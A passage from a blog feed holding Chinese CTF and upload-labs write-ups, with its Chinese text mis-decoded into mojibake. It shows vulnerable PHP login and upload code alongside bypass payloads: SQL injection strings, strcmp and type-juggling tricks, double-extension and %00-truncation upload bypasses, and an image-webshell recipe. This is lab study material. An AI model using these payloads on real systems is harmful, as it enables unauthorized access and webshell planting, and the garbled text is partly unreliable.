				<span class="hljs-keyword">if</span>(<span class="hljs-built_in">map</span>[i][j]==<span class="hljs-string">'S'</span>) <span class="hljs-comment">//è®°å½•èµ·ç‚¹åæ ‡ </span>
				 &#123;
					sx=i,sy=j;
				 &#125; 
				 <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-built_in">map</span>[i][j]==<span class="hljs-string">'E'</span>)  <span class="hljs-comment">//è®°å½•ç»ˆç‚¹åæ ‡ </span>
				 &#123;
				 	ex=i,ey=j;
				 &#125;
				&#125;
			&#125;
			<span class="hljs-built_in">cout</span>&lt;&lt;bfs()&lt;&lt;<span class="hljs-built_in">endl</span>;
		&#125;
	&#125;
	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;</code></pre></div>

]]></content>
      <categories>
        <category>C++</category>
      </categories>
      <tags>
        <tag>bfs</tag>
      </tags>
  </entry>
  <entry>
    <title>nctf-2</title>
    <url>/2020/09/02/nctf-2/</url>
    <content><![CDATA[<h1 id="NCTF-2"><a href="#NCTF-2" class="headerlink" title="NCTF-2"></a>NCTF-2</h1><a id="more"></a>

<h2 id="SQLæ³¨å…¥1"><a href="#SQLæ³¨å…¥1" class="headerlink" title="SQLæ³¨å…¥1"></a>SQLæ³¨å…¥1</h2><p>é¢˜ç›®æºç ç»™å‡º</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">if</span>($_POST[user] &amp;&amp; $_POST[pass]) &#123;
    mysql_connect(SAE_MYSQL_HOST_M . <span class="hljs-string">':'</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
  mysql_select_db(SAE_MYSQL_DB);
  $user = trim($_POST[user]);
  $pass = md5(trim($_POST[pass]));
  $sql=<span class="hljs-string">"select user from ctf where (user='"</span>.$user.<span class="hljs-string">"') and (pw='"</span>.$pass.<span class="hljs-string">"')"</span>;
    <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;/br&gt;'</span>.$sql;
  $query = mysql_fetch_array(mysql_query($sql));
  <span class="hljs-keyword">if</span>($query[user]==<span class="hljs-string">"admin"</span>) &#123;
      <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;"</span>;
  &#125;
  <span class="hljs-keyword">if</span>($query[user] != <span class="hljs-string">"admin"</span>) &#123;
    <span class="hljs-keyword">echo</span>(<span class="hljs-string">"&lt;p&gt;You are not admin!&lt;/p&gt;"</span>);
  &#125;
&#125;
<span class="hljs-keyword">echo</span> $query[user];
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>é¦–å…ˆpostæ–¹æ³•ä¼ é€’userå’Œpassä¸¤ä¸ªå‚æ•°ï¼Œç„¶åå¸¦å…¥sqlè¯­å¥ä¸­æŸ¥è¯¢</p>
<p>æ³¨å…¥ç‚¹åœ¨è¿™ä¸ªä½ç½®</p>
<p><code>$sql=&quot;select user from ctf where (user=&#39;&quot;.$user.&quot;&#39;) and (pw=&#39;&quot;.$pass.&quot;&#39;)&quot;</code></p>
<p><code>select user from ctf where (user=&#39;&#39;) and (pw=&#39;&#39;)</code></p>
<p>æ„é€ è¯­å¥</p>
<p><code>select user from ctf where (user=&#39;admin&#39;) or 1=1 #)   and (pw=&#39;&#39;)</code> </p>
<p>åœ¨usernameä¸­å¡«å…¥<code>admin&#39;) or 1=1 #</code>æˆ–è€…<code>admin&#39;) and 1=1 #</code>ï¼Œæäº¤å³å¯è·å¾—flag</p>
<p><img src="/2020/09/02/nctf-2/sql1.png" srcset="/img/loading.gif" alt></p>
<h2 id="passcheck"><a href="#passcheck" class="headerlink" title="passcheck"></a>passcheck</h2><div class="hljs"><pre><code class="hljs php">$pass=@$_POST[<span class="hljs-string">'pass'</span>];
$pass1=***********;<span class="hljs-comment">//è¢«éšè—èµ·æ¥çš„å¯†ç </span>
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($pass))
&#123;
<span class="hljs-keyword">if</span>(@!strcmp($pass,$pass1))&#123;
<span class="hljs-keyword">echo</span> <span class="hljs-string">"flag:nctf&#123;*&#125;"</span>;
&#125;<span class="hljs-keyword">else</span>&#123;
<span class="hljs-keyword">echo</span> <span class="hljs-string">"the pass is wrong!"</span>;
&#125;
&#125;<span class="hljs-keyword">else</span>&#123;
<span class="hljs-keyword">echo</span> <span class="hljs-string">"please input pass!"</span>;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>strcmp() å‡½æ•°æ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²ã€‚</p>
<p><strong>æ³¨é‡Šï¼š</strong>strcmp() å‡½æ•°æ˜¯äºŒè¿›åˆ¶å®‰å…¨çš„ï¼Œä¸”å¯¹å¤§å°å†™æ•æ„Ÿã€‚</p>
<p><strong>æç¤ºï¼š</strong>è¯¥å‡½æ•°ä¸ <a href="https://www.w3school.com.cn/php/func_string_strncmp.asp" target="_blank" rel="noopener">strncmp()</a> å‡½æ•°ç±»ä¼¼ï¼Œä¸åŒçš„æ˜¯ï¼Œé€šè¿‡ strncmp() æ‚¨å¯ä»¥æŒ‡å®šæ¯ä¸ªå­—ç¬¦ä¸²ç”¨äºæ¯”è¾ƒçš„å­—ç¬¦æ•°ã€‚</p>
<p><img src="/2020/09/02/nctf-2/strcmp.png" srcset="/img/loading.gif" alt></p>
<p>åªæœ‰pass==pass1æ—¶æ‰æ˜¾ç¤ºflag</p>
<p>æ„Ÿè§‰è·Ÿä¹‹å‰çš„å˜é‡è¦†ç›–ç›¸ä¼¼</p>
<p><img src="/2020/09/02/nctf-2/passcheck.png" srcset="/img/loading.gif" alt></p>
<p><strong>çŸ¥è¯†ç‚¹ï¼š</strong><br>ã€€ã€€strcmp()å‡½æ•° ï¼šphp5.3ä¹‹å‰çš„strcmpçš„æ¼æ´ï¼Œå½“å‚æ•°ä¸­çš„ä¸€ä¸ªå­—ç¬¦ä¸²æ˜¯å¯¹è±¡æˆ–è€…æ•°ç»„æ—¶ï¼Œå‡½æ•°ä¼šè¿”å›0ï¼›<br>ã€€ã€€hackbarçš„ä½¿ç”¨ï¼Œpostæ–¹æ³•<br>ã€€ã€€phpå¼±ç±»å‹ï¼Œæ•°ç»„çš„ä½¿ç”¨ã€‚</p>
<p>å‚è€ƒï¼š <a href="https://www.cnblogs.com/islsy/p/10667426.html" target="_blank" rel="noopener">https://www.cnblogs.com/islsy/p/10667426.html</a> </p>
<h2 id="èµ·åå­—çœŸéš¾"><a href="#èµ·åå­—çœŸéš¾" class="headerlink" title="èµ·åå­—çœŸéš¾"></a>èµ·åå­—çœŸéš¾</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">noother_says_correct</span><span class="hljs-params">($number)</span></span>
<span class="hljs-function"></span>&#123;
       $one = ord(<span class="hljs-string">'1'</span>);
       $nine = ord(<span class="hljs-string">'9'</span>);
       <span class="hljs-keyword">for</span> ($i = <span class="hljs-number">0</span>; $i &lt; strlen($number); $i++)
       &#123;   
               $digit = ord($number&#123;$i&#125;);
               <span class="hljs-keyword">if</span> ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) <span class="hljs-comment">//numberä¸­çš„æ•°å­—ä¸èƒ½åœ¨1-9</span>
               &#123;
                       <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;
               &#125;
       &#125;
          <span class="hljs-keyword">return</span> $number == <span class="hljs-string">'54975581388'</span>; <span class="hljs-comment">//numberçš„å€¼ç­‰äº54975581388ï¼Œä¸ä¹‹å‰ifè¯­å¥çŸ›ç›¾</span>
&#125;
$flag=<span class="hljs-string">'*******'</span>;
<span class="hljs-keyword">if</span>(noother_says_correct($_GET[<span class="hljs-string">'key'</span>]))
   <span class="hljs-keyword">echo</span> $flag;
<span class="hljs-keyword">else</span> 
   <span class="hljs-keyword">echo</span> <span class="hljs-string">'access denied'</span>;
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>å°è¯•å°†54975581388è½¬æˆåå…­è¿›åˆ¶</p>
<p>0xccccccccc,  cçš„aå€¼ä¸º12ï¼Œæ»¡è¶³ifåˆ¤æ–­è¯­å¥</p>
<p><code>?key=0xccccccccc</code></p>
<h2 id="sqlinject"><a href="#sqlinject" class="headerlink" title="sqlinject"></a>sqlinject</h2><p>æŸ¥çœ‹æºç </p>
<div class="hljs"><pre><code class="hljs php">&lt;!--
<span class="hljs-comment">#GOAL: login as admin,then get the flag;</span>
error_reporting(<span class="hljs-number">0</span>);
<span class="hljs-keyword">require</span> <span class="hljs-string">'db.inc.php'</span>;

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">clean</span><span class="hljs-params">($str)</span></span>&#123;  
	<span class="hljs-keyword">if</span>(get_magic_quotes_gpc())&#123;  <span class="hljs-comment">//é˜²æ­¢æ³¨å…¥</span>
		$str=stripslashes($str); <span class="hljs-comment">//æ·»åŠ  \</span>
	&#125;
	<span class="hljs-keyword">return</span> htmlentities($str, ENT_QUOTES);<span class="hljs-comment">//è¿‡æ»¤æ‰å•å¼•å·ï¼ŒåŒå¼•å·ï¼Œæˆ–è€…å…¼è€Œæœ‰ä¹‹</span>
&#125;

$username = @clean((string)$_GET[<span class="hljs-string">'username'</span>]);<span class="hljs-comment">//å¯¹è·å–çš„å‚æ•°è¿›è¡Œäº†å¤„ç†</span>
$password = @clean((string)$_GET[<span class="hljs-string">'password'</span>]);

$query=<span class="hljs-string">'SELECT * FROM users WHERE name=\''</span>.$username.<span class="hljs-string">'\' AND pass=\''</span>.$password.<span class="hljs-string">'\';'</span>;<span class="hljs-comment">//å­˜åœ¨æ³¨å…¥çš„è¯­å¥</span>
$result=mysql_query($query);
<span class="hljs-keyword">if</span>(!$result || mysql_num_rows($result) &lt; <span class="hljs-number">1</span>)&#123;
	<span class="hljs-keyword">die</span>(<span class="hljs-string">'Invalid password!'</span>);
&#125;

<span class="hljs-keyword">echo</span> $flag;
--&gt;</code></pre></div>

<p> <strong>magic_quotes_gpcå‡½æ•°åœ¨phpä¸­çš„ä½œç”¨æ˜¯åˆ¤æ–­è§£æç”¨æˆ·æç¤ºçš„æ•°æ®ï¼Œå¦‚åŒ…æ‹¬æœ‰:postã€getã€cookieè¿‡æ¥çš„æ•°æ®å¢åŠ è½¬ä¹‰å­—ç¬¦â€œ\â€ï¼Œä»¥ç¡®ä¿è¿™äº›æ•°æ®ä¸ä¼šå¼•èµ·ç¨‹åºï¼Œç‰¹åˆ«æ˜¯æ•°æ®åº“è¯­å¥å› ä¸ºç‰¹æ®Šå­—ç¬¦å¼•èµ·çš„æ±¡æŸ“è€Œå‡ºç°è‡´å‘½çš„é”™è¯¯</strong> </p>
<p> <code>SELECT * FROM users WHERE name=\&#39;&#39;.$username.&#39;\&#39; AND pass=\&#39;&#39;.$password.&#39;\&#39;;</code> </p>
<p> åæ–œæ é‡åˆ°å•å¼•å·åï¼Œèµ·åˆ°è½¬ä¹‰ä½œç”¨ï¼Œå®é™…sqlè¯­å¥å¦‚ä¸‹</p>
<p><code>SELECT * FROM users WHERE name=&#39;.$username.&#39; AND pass=&#39;.$password.&#39;;</code> </p>
<p>è¿™é‡Œæ³¨å…¥ä¸ä¹‹å‰çš„æ³¨å…¥ä¸åŒï¼Œè¿™é‡Œé’ˆå¯¹çš„æ˜¯password</p>
<p><code>SELECT * FROM users WHERE name=&#39; \&#39; AND pass=&#39;  or 1=1 --+&#39;;</code></p>
<p><code>\&#39; AND pass=</code> ä½œä¸ºname å‚æ•°çš„å€¼</p>
<p>æ‰€ä»¥æ„é€ ?name=&amp;password=or 1=1 â€“+</p>
<p><img src="/2020/09/02/nctf-2/sql2.png" srcset="/img/loading.gif" alt></p>
<h2 id="SQLæ³¨å…¥2"><a href="#SQLæ³¨å…¥2" class="headerlink" title="SQLæ³¨å…¥2"></a>SQLæ³¨å…¥2</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">if</span>($_POST[user] &amp;&amp; $_POST[pass]) &#123; <span class="hljs-comment">//post æ–¹å¼æ¥æ”¶ä¸¤ä¸ªå‚æ•°</span>
   mysql_connect(SAE_MYSQL_HOST_M . <span class="hljs-string">':'</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
  mysql_select_db(SAE_MYSQL_DB);
  $user = $_POST[user];
  $pass = md5($_POST[pass]);<span class="hljs-comment">//å¯¹pass  md5åŠ å¯†</span>
  $query = @mysql_fetch_array(mysql_query(<span class="hljs-string">"select pw from ctf where user='$user'"</span>));<span class="hljs-comment">//è·å–pwå­—æ®µçš„å€¼</span>
  <span class="hljs-keyword">if</span> (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) &#123; <span class="hljs-comment">// æ¯”è¾ƒpasså’Œpw</span>
      <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;p&gt;Logged in! Key: ntcf&#123;**************&#125; &lt;/p&gt;"</span>;
  &#125;
  <span class="hljs-keyword">else</span> &#123;
    <span class="hljs-keyword">echo</span>(<span class="hljs-string">"&lt;p&gt;Log in failure!&lt;/p&gt;"</span>);
  &#125;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>poyload:</p>
<p><code>user= &#39; union select md(1) &amp;pass=1</code></p>
<p><code>select pw from ctf where user=&#39;&#39; union select md(1)</code> </p>
<p>æ­¤æŸ¥è¯¢è¯­å¥è·å¾—æˆ‘pwå€¼ä¸ºmd(1),æ‰€ä»¥<code>if (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw])))</code>è¯­å¥æˆç«‹ï¼Œæ˜¾ç¤ºflag</p>
<p>(è¿˜æ²¡å®Œå…¨ç†è§£)</p>
<h2 id="ç»¼åˆé¢˜"><a href="#ç»¼åˆé¢˜" class="headerlink" title="ç»¼åˆé¢˜"></a>ç»¼åˆé¢˜</h2><p> é¦–é¡µä¸­ç»™å‡ºå¾ˆé•¿çš„<code>jsfuck</code>ï¼Œå¯ä»¥ä½¿ç”¨æµè§ˆå™¨çš„<code>console</code>è§£ç  ,ç»™å‡ºä¸€ä¸ªé¡µé¢</p>
<p>è®¿é—® <code>1bc29b36f623ba82aaf6724fd3b16718.php</code> </p>
<p><img src="/2020/09/02/nctf-2/ch2.png" srcset="/img/loading.gif" alt></p>
<p>æç¤ºåœ¨headeré‡Œ</p>
<p><img src="/2020/09/02/nctf-2/ch1.png" srcset="/img/loading.gif" alt></p>
<p>æŸ¥çœ‹header</p>
<p><img src="/2020/09/02/nctf-2/ch.png" srcset="/img/loading.gif" alt></p>
<p> <code>history of bash</code>ä½¿ç”¨è¿‡linuxçš„åŒå¿—ä¼šçŸ¥é“ï¼Œå¦‚æœä½¿ç”¨çš„æ˜¯<code>bash</code>ï¼Œåœ¨å®¶ç›®å½•ä¸­ä¼šç”Ÿæˆ<code>.bash_history</code>æ–‡ä»¶ç”¨æ¥ä¿å­˜å†å²å‘½ä»¤ã€‚<br>è®¿é—®<code>.bash_history</code>æ–‡ä»¶ï¼Œå¯ä»¥å¾—åˆ°è¿™æ ·çš„å†å²å‘½ä»¤ </p>
<p>url: <a href="http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history" target="_blank" rel="noopener">http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history</a> </p>
<p>è·å¾—<code>zip -r flagbak.zip ./*</code></p>
<p>è®¿é—® <a href="http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip" target="_blank" rel="noopener">http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip</a></p>
<h2 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents"></a>file_get_contents</h2><p>æŸ¥çœ‹æºç è·å–è¢«æ³¨é‡Šçš„å†…å®¹</p>
<div class="hljs"><pre><code class="hljs php">$file = $_GET[<span class="hljs-string">'file'</span>];
<span class="hljs-keyword">if</span>(@file_get_contents($file) == <span class="hljs-string">"meizijiu"</span>)&#123;
    <span class="hljs-keyword">echo</span> $nctf;
&#125;</code></pre></div>

<p>åˆ†æå¯å¾—</p>
<p><strong>é€šè¿‡getæ–¹å¼ä¼ é€’<code>flle</code>=æ–‡ä»¶å</strong><br><strong>å¹¶ä¸”è¿™ä¸ªæ–‡ä»¶çš„å†…å®¹==â€˜meizijiuâ€™</strong><br><strong>å¦‚æœç­‰äºå°±æ‰“å°flag</strong> </p>
<p>phpä¼ªåè®®<code>php://input</code>æ¥æ„é€ åŸå§‹æ•°æ®çš„åªè¯»æµ </p>
<p><img src="/2020/09/02/nctf-2/file.png" srcset="/img/loading.gif" alt></p>
<h2 id="å˜é‡è¦†ç›–"><a href="#å˜é‡è¦†ç›–" class="headerlink" title="å˜é‡è¦†ç›–"></a>å˜é‡è¦†ç›–</h2><p>å‚è€ƒ <a href="https://blog.csdn.net/niexinming/article/details/52637773?utm_source=blogxgwz1" target="_blank" rel="noopener">https://blog.csdn.net/niexinming/article/details/52637773?utm_source=blogxgwz1</a> </p>
<p>æºç </p>
<div class="hljs"><pre><code class="hljs php">&lt;!--<span class="hljs-keyword">foreach</span>($_GET <span class="hljs-keyword">as</span> $key =&gt; $value)&#123;  
        $$key = $value;  
&#125;  
<span class="hljs-keyword">if</span>($name == <span class="hljs-string">"meizijiu233"</span>)&#123;
    <span class="hljs-keyword">echo</span> $flag;
&#125;--&gt;</code></pre></div>

<p><code>?name=meizijiu233</code></p>
<p><img src="/2020/09/02/nctf-2/fugai.png" srcset="/img/loading.gif" alt></p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>sql</tag>
        <tag>å¼±ç±»å‹</tag>
        <tag>å˜é‡è¦†ç›–</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>upload-11-21</title>
    <url>/2020/09/18/upload2/</url>
    <content><![CDATA[<h1 id="upload-labs-11-21"><a href="#upload-labs-11-21" class="headerlink" title="upload-labs 11-21"></a>upload-labs 11-21</h1><a id="more"></a>

<h2 id="pass11"><a href="#pass11" class="headerlink" title="pass11"></a>pass11</h2><div class="hljs"><pre><code class="hljs php">$is_upload = <span class="hljs-keyword">false</span>;
$msg = <span class="hljs-keyword">null</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'submit'</span>])) &#123;
    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;
        $deny_ext = <span class="hljs-keyword">array</span>(<span class="hljs-string">"php"</span>,<span class="hljs-string">"php5"</span>,<span class="hljs-string">"php4"</span>,<span class="hljs-string">"php3"</span>,<span class="hljs-string">"php2"</span>,<span class="hljs-string">"html"</span>,<span class="hljs-string">"htm"</span>,<span class="hljs-string">"phtml"</span>,<span class="hljs-string">"pht"</span>,<span class="hljs-string">"jsp"</span>,<span class="hljs-string">"jspa"</span>,<span class="hljs-string">"jspx"</span>,<span class="hljs-string">"jsw"</span>,<span class="hljs-string">"jsv"</span>,<span class="hljs-string">"jspf"</span>,<span class="hljs-string">"jtml"</span>,<span class="hljs-string">"asp"</span>,<span class="hljs-string">"aspx"</span>,<span class="hljs-string">"asa"</span>,<span class="hljs-string">"asax"</span>,<span class="hljs-string">"ascx"</span>,<span class="hljs-string">"ashx"</span>,<span class="hljs-string">"asmx"</span>,<span class="hljs-string">"cer"</span>,<span class="hljs-string">"swf"</span>,<span class="hljs-string">"htaccess"</span>,<span class="hljs-string">"ini"</span>);

        $file_name = trim($_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'name'</span>]);
        $file_name = str_ireplace($deny_ext,<span class="hljs-string">""</span>, $file_name);
        $temp_file = $_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'tmp_name'</span>];
        $img_path = UPLOAD_PATH.<span class="hljs-string">'/'</span>.$file_name;        
        <span class="hljs-keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;
            $is_upload = <span class="hljs-keyword">true</span>;
        &#125; <span class="hljs-keyword">else</span> &#123;
            $msg = <span class="hljs-string">'ä¸Šä¼ å‡ºé”™ï¼'</span>;
        &#125;
    &#125; <span class="hljs-keyword">else</span> &#123;
        $msg = UPLOAD_PATH . <span class="hljs-string">'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'</span>;
    &#125;
&#125;</code></pre></div>


<p> <code>$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</code></p>
<p>è¿™æ®µä»£ç æ˜¯å°†æ–‡ä»¶åä¸­å‡ºç°  <code>deny_ext</code>çš„åç¼€åæ›¿æ¢ä¸ºç©º</p>
<p>å¯ä»¥åŒå†™ç»•è¿‡ï¼Œå³<code>1.pphphp</code></p>
<p><img src="/2020/09/18/upload2/11.png" srcset="/img/loading.gif" alt></p>
<h2 id="pass12"><a href="#pass12" class="headerlink" title="pass12"></a>pass12</h2><div class="hljs"><pre><code class="hljs php">$is_upload = <span class="hljs-keyword">false</span>;
$msg = <span class="hljs-keyword">null</span>;
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'submit'</span>]))&#123;
    $ext_arr = <span class="hljs-keyword">array</span>(<span class="hljs-string">'jpg'</span>,<span class="hljs-string">'png'</span>,<span class="hljs-string">'gif'</span>);
    $file_ext = substr($_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'name'</span>],strrpos($_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'name'</span>],<span class="hljs-string">"."</span>)+<span class="hljs-number">1</span>);
    <span class="hljs-keyword">if</span>(in_array($file_ext,$ext_arr))&#123;
        $temp_file = $_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'tmp_name'</span>];
        $img_path = $_GET[<span class="hljs-string">'save_path'</span>].<span class="hljs-string">"/"</span>.rand(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).date(<span class="hljs-string">"YmdHis"</span>).<span class="hljs-string">"."</span>.$file_ext;

        <span class="hljs-keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;
            $is_upload = <span class="hljs-keyword">true</span>;
        &#125; <span class="hljs-keyword">else</span> &#123;
            $msg = <span class="hljs-string">'ä¸Šä¼ å‡ºé”™ï¼'</span>;
        &#125;
    &#125; <span class="hljs-keyword">else</span>&#123;
        $msg = <span class="hljs-string">"åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼"</span>;
    &#125;
&#125;</code></pre></div>

<p>æœ¬é¢˜ä¸ä¹‹å‰çš„é¢˜ç›®æœ‰æ‰€ä¸åŒï¼Œè¿™é¢˜çš„æ–‡ä»¶çš„ä¿å­˜è·¯å¾„æ˜¯å¯ä»¥æ§åˆ¶çš„</p>
<p>è¿™é‡Œç”¨çš„<code>%00æˆªæ–­</code>ï¼ŒåŸç†å¦‚ä¸‹</p>
<p><code>www.xxx.com/qq.jpg</code></p>
<p><code>www.xxx.com/qq.php%00.jpg =&gt; www.xxx.com/qq.php</code>å…¶åç¼€åä¸º.jpgå¯ä»¥ç»•è¿‡æ£€æµ‹ï¼Œä½†æ˜¯windowsç³»ç»Ÿå¤„ç†æ—¶ä¸ä¼šå¤„ç†%00ä¹‹åçš„å†…å®¹æ•…ä¿å­˜çš„æ–‡ä»¶å°±æ˜¯qq.php</p>
<p><img src="/2020/09/18/upload2/12.png" srcset="/img/loading.gif" alt></p>
<h2 id="pass13"><a href="#pass13" class="headerlink" title="pass13"></a>pass13</h2><p>è¿™é¢˜ä¸ä¸Šé¢˜åˆ©ç”¨çš„åŸç†ç›¸åŒ</p>
<p>ä½†æ˜¯è¿™é‡Œè¦ä½¿ç”¨ 00çš„äºŒè¿›åˆ¶å½¢å¼</p>
<p><img src="/2020/09/18/upload2/13.png" srcset="/img/loading.gif" alt></p>
<p><img src="/2020/09/18/upload2/13-1.png" srcset="/img/loading.gif" alt></p>
<h2 id="pass14"><a href="#pass14" class="headerlink" title="pass14"></a>pass14</h2><p><img src="/2020/09/18/upload2/14.png" srcset="/img/loading.gif" alt></p>
<p>æ˜ç¡®è¯´äº†ä¸Šä¼ å›¾ç‰‡æœ¨é©¬</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getReailFileType</span><span class="hljs-params">($filename)</span></span>&#123;
    $file = fopen($filename, <span class="hljs-string">"rb"</span>);
    $bin = fread($file, <span class="hljs-number">2</span>); <span class="hljs-comment">//åªè¯»2å­—èŠ‚</span>
    fclose($file);
    $strInfo = @unpack(<span class="hljs-string">"C2chars"</span>, $bin);    
    $typeCode = intval($strInfo[<span class="hljs-string">'chars1'</span>].$strInfo[<span class="hljs-string">'chars2'</span>]);    
    $fileType = <span class="hljs-string">''</span>;    
    <span class="hljs-keyword">switch</span>($typeCode)&#123;      
        <span class="hljs-keyword">case</span> <span class="hljs-number">255216</span>:            
            $fileType = <span class="hljs-string">'jpg'</span>;
            <span class="hljs-keyword">break</span>;
        <span class="hljs-keyword">case</span> <span class="hljs-number">13780</span>:            
            $fileType = <span class="hljs-string">'png'</span>;
            <span class="hljs-keyword">break</span>;        
        <span class="hljs-keyword">case</span> <span class="hljs-number">7173</span>:            
            $fileType = <span class="hljs-string">'gif'</span>;
            <span class="hljs-keyword">break</span>;
        <span class="hljs-keyword">default</span>:            
            $fileType = <span class="hljs-string">'unknown'</span>;
        &#125;    
        <span class="hljs-keyword">return</span> $fileType;
&#125;</code></pre></div>

<p><strong>GIF89a</strong> æ˜¯GIFå›¾ç‰‡çš„æ–‡ä»¶å¤´ ï¼Œæ˜¯ä¸ºäº†ç»•è¿‡gifæ–‡ä»¶çš„æ£€æŸ¥</p>
<p><strong>å›¾ç‰‡æœ¨é©¬çš„åˆ¶ä½œ</strong></p>
<p>æ¡Œé¢å»ºç«‹ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶å°†å…¶æ”¹ä¸º2.jpgï¼Œå†å»ºç«‹ä¸€ä¸ªæ”¹ä¸º1.php,å…¶å†…å®¹ä¸ºä½ æƒ³æ·»åŠ çš„ä¸€å¥è¯æœ¨é©¬</p>
<p><img src="/2020/09/18/upload2/14-1.png" srcset="/img/loading.gif" alt></p>
<p><code>copy 2.jpg /b + 1.php /a webshell.jpg</code></p>
<p><img src="/2020/09/18/upload2/14-2.png" srcset="/img/loading.gif" alt></p>
<p><strong>æœªå®Œå¾…ç»­ã€‚ã€‚ã€‚</strong></p>
]]></content>
      <categories>
        <category>æ–‡ä»¶ä¸Šä¼ </category>
      </categories>
      <tags>
        <tag>åŒå†™ç»•è¿‡</tag>
        <tag>00æˆªæ–­</tag>
      </tags>
  </entry>
  <entry>
    <title>uploads-labs</title>
    <url>/2020/09/16/uploads/</url>
    <content><![CDATA[<h1 id="upload-labs-1-10"><a href="#upload-labs-1-10" class="headerlink" title="upload-labs 1-10"></a>upload-labs 1-10</h1><a id="more"></a>



<h2 id="pass1"><a href="#pass1" class="headerlink" title="pass1"></a>pass1</h2><p>ç›´æ¥æŠ“åŒ…ä¿®æ”¹æ–‡ä»¶åç¼€åä¸ºjpg,png,gifå³å¯</p>
<h2 id="pass2"><a href="#pass2" class="headerlink" title="pass2"></a>pass2</h2><p>æŸ¥çœ‹æºç </p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (($_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'type'</span>] == <span class="hljs-string">'image/jpeg'</span>) || ($_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'type'</span>] == <span class="hljs-string">'image/png'</span>) || ($_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'type'</span>] == <span class="hljs-string">'image/gif'</span>))</code></pre></div>

<p>è¿™æ®µä»£ç è¯´æ˜æ˜¯å¯¹æ–‡ä»¶çš„<code>MIME</code>ç±»å‹è¿›è¡Œäº†è¿‡æ»¤ï¼Œç›´æ¥ä¸Šä¼  1.php æŠ“åŒ…åä¿®æ”¹æ–‡ä»¶ç±»å‹ä¸º <code>&#39;image/jpeg&#39; ,&#39;image/png&#39;,&#39;image/gif&#39;</code>,è¿™ä¸‰ä¸ªç±»å‹éƒ½ä¸ºå›¾ç‰‡</p>
<p><img src="/2020/09/16/uploads/2.png" srcset="/img/loading.gif" alt></p>
<p>çŸ¥è¯†ç‚¹è¡¥å……ï¼š</p>
<p> <strong>MIMEç±»å‹å¯¹å¤§å°å†™ä¸æ•æ„Ÿï¼Œä½†æ˜¯ä¼ ç»Ÿå†™æ³•éƒ½æ˜¯å°å†™ã€‚</strong> </p>
<div class="hljs"><pre><code class="hljs applescript"><span class="hljs-built_in">text</span>/plain
<span class="hljs-built_in">text</span>/html
image/jpeg
image/png
audio/mpeg
audio/ogg
audio/*
video/mp4
<span class="hljs-built_in">application</span>/*
<span class="hljs-built_in">application</span>/json
<span class="hljs-built_in">application</span>/javascript
<span class="hljs-built_in">application</span>/ecmascript
<span class="hljs-built_in">application</span>/octet-stream</code></pre></div>

<p>æ›´è¯¦ç»†çš„è§£é‡Šï¼Œ</p>
<h2 id="pass3"><a href="#pass3" class="headerlink" title="pass3"></a>pass3</h2><div class="hljs"><pre><code class="hljs php">$deny_ext = <span class="hljs-keyword">array</span>(<span class="hljs-string">'.asp'</span>,<span class="hljs-string">'.aspx'</span>,<span class="hljs-string">'.php'</span>,<span class="hljs-string">'.jsp'</span>);</code></pre></div>

